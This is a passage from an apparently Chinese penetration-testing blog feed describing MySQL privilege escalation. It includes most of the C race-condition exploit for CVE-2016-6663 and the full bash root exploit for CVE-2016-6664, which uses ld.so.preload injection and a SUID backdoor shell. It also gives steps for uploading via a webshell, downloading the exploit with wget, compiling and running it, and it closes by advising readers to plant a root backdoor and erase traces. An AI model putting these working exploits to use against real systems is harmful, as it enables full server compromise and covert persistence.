class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod g+s /tmp/&quot;</span> EXP_DIRN );<br><br>    <span class="hljs-comment">// Prepare exploit tables :)</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Creating mysql tables \n\n&quot;</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br>    <span class="hljs-comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /bin/bash &quot;</span> SUID_SHELL);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls -l &quot;</span> SUID_SHELL);<br><br>    <span class="hljs-comment">// Use inotify to get the timing right</span><br>    fd = <span class="hljs-built_in">inotify_init</span>();<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to inotify_init\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    ret = <span class="hljs-built_in">inotify_add_watch</span>(fd, EXP_PATH, IN_CREATE | IN_CLOSE);<br><br><br>    <span class="hljs-comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Entering the race loop... Hang in there...\n&quot;</span>);<br><br>    <span class="hljs-keyword">while</span> ( is_shell_suid != <span class="hljs-number">1</span> ) &#123;<br><br>        cnt++;<br><span class="hljs-keyword">if</span> ( (cnt % <span class="hljs-number">100</span>) == <span class="hljs-number">0</span> ) &#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-&gt;&quot;</span>);<br> <span class="hljs-comment">//fflush(stdout);</span><br>&#125;<br><br>        <span class="hljs-comment">/* Create empty file , remove if already exists */</span><br>        <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>        <span class="hljs-built_in">unlink</span>(MYSQL_TAB_FILE);<br>   <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* random num if needed */</span><br>        <span class="hljs-built_in">srand</span> ( <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>) );<br>        randomnum = ( <span class="hljs-built_in">rand</span>() % MAX_DELAY );<br><br>        <span class="hljs-comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br>        pid = fork();<br>        <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Fork failed :(\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Child process - executes REPAIR TABLE  SQL statement */</span><br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">usleep</span>(<span class="hljs-number">500</span>);<br>            <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;REPAIR TABLE exploit_table EXTENDED&quot;</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// child stops here</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br>        <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span> ) &#123;<br>            io_notified = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">int</span> processed = <span class="hljs-number">0</span>;<br>                ret = <span class="hljs-built_in">read</span>(fd, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">while</span> (processed &lt; ret) &#123;<br>                    event = (struct inotify_event *)(buf + processed);<br>                    <span class="hljs-keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(event-&gt;name, <span class="hljs-string">&quot;exploit_table.TMD&quot;</span>)) &#123;<br>                            <span class="hljs-comment">//usleep(randomnum);</span><br><br>    <span class="hljs-comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br>    <span class="hljs-built_in">unlink</span>(MYSQL_TAB_FILE);<br>    myd_handle = <span class="hljs-built_in">open</span>(MYSQL_TAB_FILE, O_CREAT, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">close</span>(myd_handle);<br>    <span class="hljs-built_in">chmod</span>(MYSQL_TAB_FILE, <span class="hljs-number">04777</span>);<br><br>    <span class="hljs-comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br>                            <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>                            <span class="hljs-built_in">symlink</span>(SUID_SHELL, MYSQL_TEMP_FILE);<br>                            io_notified=<span class="hljs-number">1</span>;<br>                        &#125;<br>                    &#125;<br>                    processed += <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(struct inotify_event);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (io_notified) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">waitpid</span>(pid, &amp;status, <span class="hljs-number">0</span>);<br>        &#125;<br><br><span class="hljs-comment">// Check if SUID bit was set at the end of this attempt</span><br>        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">lstat</span>(SUID_SHELL, &amp;st) == <span class="hljs-number">0</span> ) &#123;<br>    <span class="hljs-keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;<br>is_shell_suid = <span class="hljs-number">1</span>;<br>    &#125;<br>        &#125; <br><br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;</span>, cnt);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls -l &quot;</span> SUID_SHELL);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(SUID_SHELL <span class="hljs-string">&quot; -p -i &quot;</span>);<br>    <span class="hljs-comment">//system(SUID_SHELL &quot; -p -c &#x27;/bin/bash -i -p&#x27;&quot;);</span><br><br>    <span class="hljs-comment">/* close MySQL connection and exit */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Job done. Exiting\n\n&quot;</span>);<br>    <span class="hljs-built_in">mysql_close</span>(conn);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我们通过菜刀写入exp：</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv10.png?raw=true"></p><p>菜刀这里执行总失败，我通过写入另一个shell反弹之后编译并执行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/<span class="hljs-keyword">include</span>/mysql -lmysqlclient<br>./mysql-privesc-race <span class="hljs-keyword">test</span> <span class="hljs-number">123456</span> localhost <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure><p>成功提权</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv11.png?raw=true"></p><h3 id="mysql提升为root权限"><a href="#mysql提升为root权限" class="headerlink" title="mysql提升为root权限"></a>mysql提升为root权限</h3><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/my</span>sql<span class="hljs-regexp">/conf.d/my</span>sqld_safe_syslog.cnf<br></code></pre></td></tr></table></figure><p>删除掉syslog，然后重启mysql，查看是否更改成功，如果更改成功，下面命令产生空结果</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -r syslog <span class="hljs-regexp">/etc/my</span>sqlsqld_safe_syslog.cnf<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv12.png?raw=true"></p><p>CVE-2016-6664 exp网址：<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p><p>CVE-2016-6664 exp：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/bin/bash -p</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit</span><br><span class="hljs-comment"># mysql-chowned.sh (ver. 1.0)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CVE-2016-6664 / OCVE-2016-5617</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Discovered and coded by:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Dawid Golunski</span><br><span class="hljs-comment"># dawid[at]legalhackers.com</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://legalhackers.com</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This PoC exploit allows attackers to (instantly) escalate their privileges</span><br><span class="hljs-comment"># from mysql system account to root through unsafe error log handling.</span><br><span class="hljs-comment"># The exploit requires that file-based logging has been configured (default).</span><br><span class="hljs-comment"># To confirm that syslog logging has not been enabled instead use:</span><br><span class="hljs-comment"># grep -r syslog /etc/mysql</span><br><span class="hljs-comment"># which should return no results.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit can be chained with the following vulnerability:</span><br><span class="hljs-comment"># CVE-2016-6663 / OCVE-2016-5616</span><br><span class="hljs-comment"># which allows attackers to gain access to mysql system account (mysql shell).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># In case database server has been configured with syslog you may also use:</span><br><span class="hljs-comment"># CVE-2016-6662 as an alternative to this exploit.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment"># ./mysql-chowned.sh path_to_error.log </span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See the full advisory for details at:</span><br><span class="hljs-comment"># https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Video PoC:</span><br><span class="hljs-comment"># https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Disclaimer:</span><br><span class="hljs-comment"># For testing purposes only. Do no harm.</span><br><span class="hljs-comment">#</span><br><br>BACKDOORSH=<span class="hljs-string">&quot;/bin/bash&quot;</span><br>BACKDOORPATH=<span class="hljs-string">&quot;/tmp/mysqlrootsh&quot;</span><br>PRIVESCLIB=<span class="hljs-string">&quot;/tmp/privesclib.so&quot;</span><br>PRIVESCSRC=<span class="hljs-string">&quot;/tmp/privesclib.c&quot;</span><br>SUIDBIN=<span class="hljs-string">&quot;/usr/bin/sudo&quot;</span><br><br><span class="hljs-keyword">function</span> cleanexit &#123;<br>    <span class="hljs-comment"># Cleanup </span><br>    echo -e <span class="hljs-string">&quot;\n[+] Cleaning up...&quot;</span><br>    rm -f <span class="hljs-variable">$PRIVESCSRC</span><br>    rm -f <span class="hljs-variable">$PRIVESCLIB</span><br>    rm -f <span class="hljs-variable">$ERRORLOG</span><br>    touch <span class="hljs-variable">$ERRORLOG</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>        echo -n &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>    fi<br>    echo -e <span class="hljs-string">&quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-variable">$1</span><br>&#125;<br><br><span class="hljs-keyword">function</span> ctrl_c() &#123;<br>        echo -e <span class="hljs-string">&quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span><br>    cleanexit <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">#intro </span><br>echo -e <span class="hljs-string">&quot;\033[94m \nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / OCVE-2016-5617\n&quot;</span><br>echo -e <span class="hljs-string">&quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span><br><br><span class="hljs-comment"># Args</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -lt <span class="hljs-number">1</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br>    echo -e <span class="hljs-string">&quot;It seems that this server uses: `ps aux | grep mysql | awk -F&#x27;log-error=&#x27; &#x27;&#123; print $2 &#125;&#x27; | cut -d&#x27; &#x27; -f1 | grep &#x27;/&#x27;`\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br><br><span class="hljs-comment"># Priv check</span><br><br>echo -e <span class="hljs-string">&quot;\n[+] Starting the exploit as \n\033[94m`id`\033[0m&quot;</span><br>id | grep -q mysql <br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] You need to execute the exploit as mysql user! Exiting.\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br><br><span class="hljs-comment"># Set target paths</span><br>ERRORLOG=<span class="hljs-string">&quot;$1&quot;</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$ERRORLOG</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn&#x27;t exist. Try again.\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br>echo -e <span class="hljs-string">&quot;\n[+] Target MySQL log file set to $ERRORLOG&quot;</span><br><br><span class="hljs-comment"># [ Active exploitation ]</span><br><br>trap ctrl_c INT<br><span class="hljs-comment"># Compile privesc preload library</span><br>echo -e <span class="hljs-string">&quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br>cat &lt;&lt;_solibeof_&gt;<span class="hljs-variable">$PRIVESCSRC</span><br><span class="hljs-comment">#define _GNU_SOURCE</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;dlfcn.h&gt;</span><br>       <span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br>       <span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br>       <span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><br>uid_t geteuid(void) &#123;<br>    static uid_t  (*old_geteuid)();<br>    old_geteuid = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;geteuid&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( old_geteuid() == <span class="hljs-number">0</span> ) &#123;<br>        chown(<span class="hljs-string">&quot;$BACKDOORPATH&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        chmod(<span class="hljs-string">&quot;$BACKDOORPATH&quot;</span>, <span class="hljs-number">04777</span>);<br>        <span class="hljs-regexp">//u</span>nlink(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>    &#125;<br>    return old_geteuid();<br>&#125;<br>_solibeof_<br><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">&quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br>    cleanexit <span class="hljs-number">2</span>;<br>fi<br><br><br><span class="hljs-comment"># Prepare backdoor shell</span><br>cp <span class="hljs-variable">$BACKDOORSH</span> <span class="hljs-variable">$BACKDOORPATH</span><br>echo -e <span class="hljs-string">&quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><br><br><span class="hljs-comment"># Safety check</span><br><span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">2</span><br>fi<br><br><span class="hljs-comment"># Symlink the log file to /etc</span><br>rm -f <span class="hljs-variable">$ERRORLOG</span> &amp;&amp; ln -s <span class="hljs-regexp">/etc/</span>ld.so.preload <span class="hljs-variable">$ERRORLOG</span><br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Couldn&#x27;t remove the $ERRORLOG file or create a symlink.&quot;</span><br>    cleanexit <span class="hljs-number">3</span><br>fi<br>echo -e <span class="hljs-string">&quot;\n[+] Symlink created at: \n`ls -l $ERRORLOG`&quot;</span><br><br><span class="hljs-comment"># Wait for MySQL to re-open the logs</span><br>echo -ne <span class="hljs-string">&quot;\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n&quot;</span><br>read -p <span class="hljs-string">&quot;Do you want to kill mysqld process to instantly get root? :) ? [y/n] &quot;</span> THE_ANSWER<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$THE_ANSWER&quot;</span> = <span class="hljs-string">&quot;y&quot;</span> ]; then<br>    echo -e <span class="hljs-string">&quot;Got it. Executing &#x27;killall mysqld&#x27; now...&quot;</span><br>    killall mysqld<br>fi<br><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span> <br>    sleep <span class="hljs-number">0.1</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>        echo <span class="hljs-variable">$PRIVESCLIB</span> &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>        rm -f <span class="hljs-variable">$ERRORLOG</span><br>        <span class="hljs-keyword">break</span>;<br>    fi<br>done<br><br><span class="hljs-comment"># /etc/    dir should be owned by mysql user at this point</span><br><span class="hljs-comment"># Inject the privesc.so shared library to escalate privileges</span><br>echo <span class="hljs-variable">$PRIVESCLIB</span> &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>echo -e <span class="hljs-string">&quot;\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><br>echo -e <span class="hljs-string">&quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><br>echo -e <span class="hljs-string">&quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><br>chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/etc/</span>ld.so.preload<br><br><span class="hljs-comment"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br>echo -e <span class="hljs-string">&quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br>sudo <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null &gt;<span class="hljs-regexp">/dev/</span>null<br><br><span class="hljs-comment">#while :; do </span><br><span class="hljs-comment">#    sleep 0.1</span><br><span class="hljs-comment">#    ps aux | grep mysqld | grep -q &#x27;log-error&#x27;</span><br><span class="hljs-comment">#    if [ $? -eq 0 ]; then</span><br><span class="hljs-comment">#        break;</span><br><span class="hljs-comment">#    fi</span><br><span class="hljs-comment">#done</span><br><br><span class="hljs-comment"># Check for the rootshell</span><br>ls -l <span class="hljs-variable">$BACKDOORPATH</span><br>ls -l <span class="hljs-variable">$BACKDOORPATH</span> | grep rws | grep -q root<br><span class="hljs-keyword">if</span> [ $? -eq <span class="hljs-number">0</span> ]; then <br>    echo -e <span class="hljs-string">&quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><br>    echo -e <span class="hljs-string">&quot;\n\033[94mGot root! The database server has been ch-OWNED !\033[0m&quot;</span><br><span class="hljs-keyword">else</span><br>    echo -e <span class="hljs-string">&quot;\n[!] Failed to get root&quot;</span><br>    cleanexit <span class="hljs-number">2</span><br>fi<br><br><br><span class="hljs-comment"># Execute the rootshell</span><br>echo -e <span class="hljs-string">&quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="hljs-variable">$BACKDOORPATH</span> -p -c <span class="hljs-string">&quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="hljs-variable">$BACKDOORPATH</span> -p<br><br><span class="hljs-comment"># Job done.</span><br>cleanexit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后我们在刚才mysql权限的shell中下载提权脚本并执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>legalhackers.com<span class="hljs-regexp">/exploits/</span>CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6664</span>/mysql-chowned.sh<br>chmod <span class="hljs-number">777</span> mysql-chowned.sh<br>.<span class="hljs-regexp">/mysql-chowned.sh /</span>var<span class="hljs-regexp">/log/my</span>sql/error.log<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv13.png?raw=true"></p><p>成功得到root权限</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv14.png?raw=true"></p><p>接下来利用root账户留后门，清理痕迹即可。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>数据库提权是后渗透阶段非常常用的提权方式，做渗透测试时，数据库是重要的突破点，只有我们对这些漏洞有一定的积累，才能面对不同的情况利用不同的漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IIS短文件名漏洞</title>
    <link href="/2018/06/28/IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/"/>
